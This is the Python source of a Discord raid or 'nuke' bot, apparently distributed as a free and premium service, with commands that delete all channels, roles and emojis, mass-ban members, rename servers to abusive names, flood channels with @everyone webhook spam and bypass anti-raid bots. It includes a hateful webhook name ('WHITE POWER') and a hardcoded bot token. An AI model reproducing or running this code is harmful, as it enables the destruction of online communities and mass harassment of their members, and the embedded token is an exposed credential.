

import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
from discord.ext import commands, tasks
import httpx
from discord.ext import commands, tasks
import datetime
import discord
from discord.ext import commands
from discord.ext.commands import cooldown, BucketType
import asyncio
from discord import Embed
import re
import string
import time
import os
import discord
import asyncio
import random
import httpx
import requests
import concurrent.futures
import asyncio
import httpx
import discord
import time
import json
from collections import defaultdict
import math
import threading
import asyncio
import httpx
import discord
from collections import defaultdict
import aiohttp
from itertools import cycle
import time
from discord.ext import commands
import psutil
from datetime import datetime, timedelta
from discord.ext.commands import cooldown
from PIL import Image
import os
import tensorflow as tf
TOKEN = 'MTE4NzQzODU0NTg3NTUyMTYwNw.Gretcc.QtwpGsOGgLDKfqit6MqPb1n0XFSzKqZKZ27hvc'
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)
bot.remove_command("help")
headers = {"Authorization": f"Bot {TOKEN}"} 

whitelist = 1186082515107196968
cum = 1169821093863882753
#https://kllore.com/proxy
invite = "https://discord.gg/ixnf"
ytlink = "https://youtu.be/lRIGjbgd9Oo"
backup = "https://discord.gg/bymgDsvPK3"
boost = "You need to boost https://discord.gg/ixnf"
ares = "."
perms = "bruh i dont have permmions give me now "
spam = f"@everyone @here  {invite} \n\n****Topc was here****\n\nJoin the server for the bot its ****free**** do +invite in 「🔨」commands https://www.youtube.com/watch?v=sqLJZTrr34k "
WEBHOOK_NAMES = ["CRY BITCH", "S̶E̶X̶", "R̶A̶I̶D̶ B̶Y̶ T̶O̶P̶C̶", "T̶o̶p̶c̶ o̶n̶ t̶o̶p̶", "WHITE POWER", "Topc", "N̶u̶k̶e̶d̶ b̶y̶ t̶o̶p̶c̶"]
CHANNEL_NAMES = ["join-topc"]
role_name = ".gg/ixnf"
start_time = datetime.utcnow()
target_server_id = 1169822266712916109
max= 50
@bot.event
async def on_ready():
    print(f'{bot.user}')

  
    custom_status = discord.Activity(type=discord.ActivityType.listening, name='.gg/ixnf')
    await bot.change_presence(status=discord.Status.online, activity=custom_status)
    check_and_leave.start()
 

@tasks.loop(seconds=1)
async def check_and_leave():
    if len(bot.guilds) >= max:
        for guild in bot.guilds:
            if guild.id != whitelist:
                await guild.leave()


def is_user_in_boosters(user_id):
    with open('boosters.txt', 'r') as file:
        booster_ids = [line.strip() for line in file.readlines()]

    return str(user_id) in booster_ids




@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    embed = discord.Embed(
        title='Pong!',
        description=f'Latency: {latency}ms',
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)


@bot.command()
@commands.cooldown(1, 1000, commands.BucketType.guild)
@commands.cooldown(1, 300, commands.BucketType.user)
async def rename_ch(ctx):
    channels = ctx.guild.text_channels[:25]
    new_names = [random.choice(CHANNEL_NAMES) for _ in range(len(channels))]
    for channel, new_name in zip(channels, new_names):
        await rename_channel(ctx.author, channel, new_name)

async def rename_channel(user, channel, new_name):
    try:
        await channel.edit(name=new_name)
    except discord.Forbidden:
        pass






@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 300, commands.BucketType.user)
async def dinvites(ctx):
    invites = await ctx.guild.invites()

    for invite in invites:
        try:
            await invite.delete()
        except discord.Forbidden:
            pass
        except Exception:
            pass







@bot.command()
@commands.cooldown(1, 1000, commands.BucketType.guild)
@commands.cooldown(1, 600, commands.BucketType.user)
async def chspam(ctx):
    async def create_channel(name):
        await ctx.guild.create_text_channel(name)

    async def create_channels_async():
        tasks = [create_channel(random.choice(CHANNEL_NAMES)) for _ in range(25)]

        for i in range(0, len(tasks), 4):
            await asyncio.gather(*tasks[i:i + 4])

            if i + 4 < len(tasks):
                await asyncio.sleep(5)

    await create_channels_async()

    embed = discord.Embed(
        title='Tuxy tracking',
        description='great work',
        color=discord.Color.green()
    )

    try:
        await ctx.author.send(embed=embed)
    except discord.Forbidden:
        pass

@bot.command()
@commands.cooldown(1, 760, commands.BucketType.guild)
@commands.cooldown(1, 200, commands.BucketType.user)
async def d_emoji(ctx):
    try:
        total_emojis = len(ctx.guild.emojis)
        emojis_deleted = 0

        start_time = time.time()

        for emoji in ctx.guild.emojis:
            await emoji.delete()
            emojis_deleted += 1

            elapsed_time = time.time() - start_time
            remaining_time = (total_emojis - emojis_deleted) * (elapsed_time / emojis_deleted) if emojis_deleted > 0 else 0

    except Exception as e:
        pass


dm_sent_users = set()

@bot.event
async def on_guild_join(guild):
    try:
        async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
            invitee = entry.user

        with open('memberbypass.txt', 'r') as file:
            memberbypass_ids = file.read().splitlines()
        
        with open('boosters.txt', 'r') as file:
            booster_ids = file.read().splitlines()

        invitee_id = str(invitee.id)
        if invitee_id in memberbypass_ids or invitee_id in booster_ids:
            
            if invitee_id not in dm_sent_users:
                try:
                    
                    dm_sent_users.add(invitee_id)  
                except:
                    text_channels = [channel for channel in guild.text_channels if isinstance(channel, discord.TextChannel)]
                    if text_channels:
                 
                        dm_sent_users.add(invitee_id) 
            return

        real_users_count = sum(1 for member in guild.members if not member.bot)

        if real_users_count < 0:
            text_channels = [channel for channel in guild.text_channels if isinstance(channel, discord.TextChannel)]
            if text_channels:
                await text_channels[0].send(f"{invitee.mention}, you need at least 5 members to invite the bot or boost/pay .gg/ixnf to bypass this")
            await guild.leave()

    except Exception as e:
        pass



@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="Help Menu",
        description="Make sure that the bot has Administrator permissions.\n\n"
                    "*******************************************************\n\n"
                    " 💛 Free commands\n\n"
                    " 💙 Premium commands\n\n"
                    f" Do {ares}review in my dms to report a bug in me or give me your review of me"
                    f" Do {ares}backup This will let you join the backup server"
                    "*******************************************************\n\n"
                    f"Do you want PREMIUM? Join Topc by clicking [here]({invite}) and boosting it.\n"
                    "> Select an option below.",
    )
    await ctx.send(embed=embed,view=SelectView())



class Select(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Free commands", value="free", emoji="💛"),
            discord.SelectOption(label="Premium commands", value="premium", emoji="💙"),
        ]
        super().__init__(placeholder="Select an option from the menu.", max_values=1, min_values=1, options=options)
    async def callback(self, interaction: discord.Interaction):
        selected_value = self.values[0]
        if selected_value == "free":
            embed1 = discord.Embed(title='NUKE') 
            embed1.add_field(name='', value=f'💛{ares}kill - Nuke the Discord server (fast)', inline=False)
            embed1.add_field(name='Nukeing commands', value=f'', inline=False)
            embed1.add_field(name='', value=f'💛{ares}cnick - Change 50 users nicknames', inline=False)
            embed1.add_field(name='', value=f'💛{ares}d_emoji - Delete all emojis', inline=False)
            embed1.add_field(name='', value=f'💛{ares}free_bypass - bypass anti nuke bots/raid bots', inline=False)
            embed1.add_field(name='', value=f'💛{ares}chspam - Make 100 new channels', inline=False)
            embed1.add_field(name='', value=f'💛{ares}dinvites- Remove all invites in the server', inline=False)
            embed1.add_field(name='', value=f'💛{ares}rename_ch- This will rename channels in the discord server', inline=False)
            embed1.add_field(name='', value=f'💛{ares}free_massban- This will banned a couple of users in the server', inline=False)
            embed1.add_field(name='Misc', value=f'', inline=False)
            embed1.add_field(name='', value=f'💛{ares}ipinfo (ip - Get information about an IP address', inline=False)
            await interaction.response.send_message(embed=embed1, ephemeral=True)
        elif selected_value == "premium":
            embed2 = discord.Embed(title='Premium Commands') 
            embed2.add_field(name='Hello dm me .settings to customize me', value=f'', inline=False)
            embed2.add_field(name='', value=f'💙{ares}custom_kill - This will let you do a custom nuke on a server', inline=False)
            embed2.add_field(name='', value=f'💙{ares}vipbanned - This will massban everyone in the server', inline=False)
            embed2.add_field(name='', value=f'💙{ares}custom_nicknames - This will let you change everyones nickname to something custom', inline=False)
            await interaction.response.send_message(embed=embed2, ephemeral=True)


class SelectView(discord.ui.View):
    def __init__(self, *, timeout = 180):
        super().__init__(timeout=timeout)
        self.add_item(Select())




headers = {"Authorization": f"Bot {TOKEN}"}

a = {"description": None, "features": ["NEWS"], "preferred_locale": "en-US", "rules_channel_id": None, "public_updates_channel_id": None}
a2 = {"features": ["COMMUNITY"], "preferred_locale": "en-US", "rules_channel_id": "1", "public_updates_channel_id": "1"}

async def CommunityFlood(ctx, session):
    try:
        async with session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{ctx.guild.id}", headers=headers, json=a2) as r:
            s = [200, 201, 204]
            if r.status in s:
                pass
            elif r.status == 429:
                b = await r.json()
                await asyncio.sleep(b['retry_after'])
    except Exception as e:
        pass

    try:
        async with session.patch(f"https://discord.com/api/v{random.randint(8, 9)}/guilds/{ctx.guild.id}", headers=headers, json=a) as r:
            s = [200, 201, 204]
            if r.status in s:
                pass
            elif r.status == 429:
                b = await r.json()
                await asyncio.sleep(b['retry_after'])
    except Exception as e:
        pass

async def RenameAndSetPermissions(ctx, channel):
    try:
        await channel.edit(name="youtube-ixnf")
        await channel.set_permissions(ctx.guild.default_role, view_channel=True, read_message_history=True)
    except Exception as e:
        pass

@bot.command()
@commands.cooldown(1, 450, commands.BucketType.user)
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def free_bypass(ctx):
    async with aiohttp.ClientSession() as session:
        tasks = [CommunityFlood(ctx, session) for _ in range(8)]
        await asyncio.gather(*tasks)

        tasks = [RenameAndSetPermissions(ctx, channel) for channel in ctx.guild.channels
                 if isinstance(channel, discord.TextChannel) and ("moderator-only" in channel.name.lower() or channel.name.lower() == "rules")]

        await asyncio.gather(*tasks)




@bot.command()
@commands.cooldown(1, 450, commands.BucketType.user)
async def vipbanned(ctx):
    with open('boosters.txt', 'r') as file:
        booster_ids = [line.strip() for line in file.readlines()]

    user_id = str(ctx.author.id)
    if user_id not in booster_ids:
        return
        for member in ctx.guild.members:
            try:
                await member.ban(reason='.gg/ixnf')
            except discord.Forbidden:
                pass  
    else:
        pass



@bot.command()
@commands.cooldown(1, 1000, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def free_massban(ctx):
    async def ban_member(member):
        try:
            await ctx.guild.ban(member, reason=".gg/ixnf")
            return True
        except Exception as e:
            return False

    banned_count = 0
    ban_coroutines = [ban_member(member) for member in ctx.guild.members]

    for index, coroutine in enumerate(ban_coroutines[:20], 1):
        if await coroutine:
            banned_count += 1
        if index % 10 == 0 and index != min(20, len(ban_coroutines)):
            await asyncio.sleep(2)  

    try:
        embed = discord.Embed(
            title="Tuxy tracking",
            description=f"Banned {banned_count} users. Thanks for using me; make sure to share the bot.",
            color=discord.Color.green()
        )
        await ctx.author.send(embed=embed)
    except discord.Forbidden:
        pass



def is_user_in_boosters(user_id):

    return True


def save_custom_info(user_id, channel_names, message_content):
    with open("settings.txt", "a") as file:
        file.write(f"{user_id}::{','.join(channel_names)}::{message_content}\n")


def remove_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    with open("settings.txt", "w") as file:
        for line in lines:
            data = line.strip().split("::")
            if len(data) == 3 and data[0] == str(user_id):
                continue  #
            file.write(line)


def get_custom_info(user_id):
    with open("settings.txt", "r") as file:
        lines = file.readlines()

    for line in lines:
        data = line.strip().split("::")
        if len(data) == 3 and data[0] == str(user_id):
            return data[1].split(','), data[2]

    return None



@bot.command()
@commands.cooldown(1, 400, commands.BucketType.guild)
@commands.cooldown(1, 800, commands.BucketType.user)
async def custom_kill(ctx):
    try:
        if ctx.guild and ctx.guild.id == target_server_id:
            return
        user = ctx.author
        if not is_user_in_boosters(str(user.id)):
            await ctx.send(f"You need to boost {invite}")
            return
        custom_info = get_custom_info(user.id)
        if not custom_info:
            await ctx.send("You need to set custom information using .settings before using this command.")
            return
        channel_names, message_content = custom_info
        guild = ctx.guild
        new_server_name = f"RAPED by {user.name}"
        await guild.edit(name=new_server_name)
        delete_channel_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_channel_tasks)
        create_channel_tasks = []
        for name in channel_names:
            if name:
                for _ in range(35):
                    try:
                        create_channel_tasks.append(guild.create_text_channel(name))
                    except discord.HTTPException:
                        pass
        created_channels = await asyncio.gather(*create_channel_tasks)
        async def send_messages_to_channel(channel, webhook):
            try:
                for _ in range(35):
                    await webhook.send(f"{message_content}\n @everyone @here Topc .gg/ixnf")
                    await asyncio.sleep(0.1)  
            except discord.HTTPException:
                pass
        webhook_creation_tasks = [channel.create_webhook(name="premium .gg/ixnf") for channel in created_channels]
        webhooks = await asyncio.gather(*webhook_creation_tasks)
        send_tasks = []
        for channel, webhook in zip(created_channels, webhooks):
            send_tasks.append(send_messages_to_channel(channel, webhook))
        await asyncio.gather(*send_tasks)
        for role in guild.roles:
            try:
                await role.delete()
            except discord.HTTPException:
                pass
        for emoji in guild.emojis:
            try:
                await emoji.delete()
            except discord.HTTPException:
                pass
        for sticker in guild.stickers:
            try:
                await sticker.delete()
            except discord.HTTPException:
                pass
    except Exception as e:
        pass  



@bot.command()
async def settings(ctx):
    if ctx.guild and ctx.guild.id == target_server_id:
        return

    user = ctx.author
    if not is_user_in_boosters(str(user.id)):
        await ctx.send(f"{boost}")
        return

    await user.send("Tell me what I should call the channels")

    def check(message):
        return message.author == user and message.channel.type == discord.ChannelType.private

    try:
        response = await bot.wait_for('message', check=check, timeout=300)
        channel_names = [name.strip() for name in response.content.split(',') if name.strip()]

        if not channel_names:
            return

        await user.send("What message do you want me to send to all channels also put your own link in the message")
        message_response = await bot.wait_for('message', check=check, timeout=300)
        message_content = message_response.content

      
        remove_custom_info(user.id)

        
        save_custom_info(user.id, channel_names, message_content)

        await user.send("Saved do .custom_kill in the server you want to n1ke with the main bot +invite in commads")

    except asyncio.TimeoutError:
        return


@bot.command()
async def custom_nicknames(ctx):
    if ctx.guild and ctx.guild.id == target_server_id:
        return

    user = ctx.author

    if not is_user_in_boosters(user.id):
        await ctx.send(f"You need to boost {invite}")
        return

    if not ctx.guild.me.guild_permissions.manage_nicknames:
        await ctx.author.send("i am missing permmions")
        return

    await ctx.author.send("Type blow the nickname you want members to have")

    def check(message):
        return message.author == ctx.author and message.guild is None

    try:
        response = await bot.wait_for('message', check=check, timeout=60)
        custom_nickname = response.content

        members = ctx.guild.members[:25]  
        for member in members:
            try:
                await member.edit(nick=custom_nickname)
            except Exception as e:
                pass  

        await ctx.send(f"done for 25 members")
    except asyncio.TimeoutError:
        await ctx.author.send("You was to slow")
    except Exception as e:
        pass  



@bot.command()
@commands.cooldown(1, 1000, commands.BucketType.guild)
@commands.cooldown(1, 700, commands.BucketType.user)
async def cnick(ctx):
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send(f"{perms}")
        return

    target_statuses = [discord.Status.online, discord.Status.idle, discord.Status.dnd]
    
    for status in target_statuses:
        members = [member for member in ctx.guild.members if member.status == status]
        
        if members:
            
            for index, member in enumerate(members[:50]):
                try:
                    new_nickname = random.choice(nicknames)
                    await member.edit(nick=new_nickname)
                except Exception as e:
                    pass  
                
                if index % 10 == 9:
                    await asyncio.sleep(3)  


messages_sent_per_channel = {}



@bot.command(name='kill', aliases=['nuke'])
@commands.cooldown(1, 1000, commands.BucketType.guild)
async def kill(ctx):
    try:
        guild = ctx.guild

        await guild.edit(name='Topc')

        if guild.icon:
            await guild.edit(icon=None)

        initial_channel_count = len(guild.channels)

        tasks = [delete_channel(channel) for channel in guild.channels]
        await asyncio.gather(*tasks)

        created_channels_with_webhooks = await create_channels_with_webhooks(guild)

        channels, webhooks = zip(*created_channels_with_webhooks)

        await asyncio.gather(*(send_messages_to_channel(channel, webhook) for channel, webhook in zip(channels, webhooks)))

    except Exception as e:
        pass

async def delete_channel(channel):
    try:
        await channel.delete()
        await asyncio.sleep(1) 
    except Exception:
        pass

async def create_channels_with_webhooks(guild):
    try:
        channels = [f'{random.choice(CHANNEL_NAMES)}' for i in range(1, 31)]
        created_channels_with_webhooks = await asyncio.gather(
            *(create_channel_with_webhook(guild, name) for name in channels)
        )

        return created_channels_with_webhooks
    except Exception:
        return []

async def create_channel_with_webhook(guild, name):
    try:
        channel = await guild.create_text_channel(name)
        webhook_name = random.choice(WEBHOOK_NAMES)
        webhook = await create_webhook(channel, webhook_name)
        return channel, webhook
    except Exception:
        return None

async def create_webhook(channel, name):
    try:
        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            async with session.post(f"https://discord.com/api/v10/channels/{channel.id}/webhooks",
                                    json={"name": name}, headers=headers) as response:
                data = await response.json()
                if 'url' in data:
                    webhook = discord.Webhook.from_url(data['url'], session=session)
                    return webhook
                else:
                    return None
    except Exception:
        return None

async def send_messages_to_channel(channel, webhook):
    try:
        if webhook is None:
            return

        channel_id = channel.id

        async with aiohttp.ClientSession() as session:
            webhook_url = f"https://discord.com/api/webhooks/{webhook.id}/{webhook.token}"
            tasks = [send_webhook_message(session, webhook_url, {"content": f"{spam}"}) for _ in range(45)]

            for task in tasks:
                await asyncio.gather(task, asyncio.sleep(0.1))

    except Exception:
        pass

async def send_webhook_message(session, webhook_url, payload):
    try:
        headers = {'Content-Type': 'application/json', "Authorization": f"Bot {TOKEN}"}
        async with session.post(webhook_url, data=json.dumps(payload), headers=headers) as response:
            if response.status != 204:
                raise Exception(f"Failed to send message to webhook. Status: {response.status}")

    except Exception:
        pass


@vipbanned.error
async def vipbanned_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@d_emoji.error
async def d_emoji_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        embed.add_field(name="YOUTUBE CHANNEL", value="[Click here](https://www.youtube.com/channel/UCKTHpY89nzQ9FHVB-UV34XA)", inline=False)
        embed.add_field(name="Join Our Discord Server", value="[Click here](https://dsc.gg/topcraid)", inline=False)

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass




async def role_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        embed.add_field(name="YOUTUBE CHANNEL", value="[Click here](https://www.youtube.com/channel/UCKTHpY89nzQ9FHVB-UV34XA)", inline=False)
        embed.add_field(name="Join Our Discord Server", value="[Click here](https://dsc.gg/topcraid)", inline=False)

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass
@cnick.error
async def cnick_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds...",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@kill.error
async def kill_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@custom_kill.error
async def custom_kill_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@vipbanned.error
async def vipbanned(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown for the command. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@free_bypass.error
async def free_bypass(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass

@chspam.error
async def chspam(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass
                    
@dinvites.error
async def dinvites(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass




@rename_ch.error
async def rename_ch(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass


@free_massban.error
async def free_massban(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        remaining_time = round(error.retry_after)

        embed = discord.Embed(
            title="Cooldown",
            description=f"You're on cooldown. Please try again in {remaining_time} seconds",
            color=discord.Color.red()
        )

        try:
            await ctx.send(embed=embed)
        except discord.Forbidden:
            pass








bot.run(TOKEN)

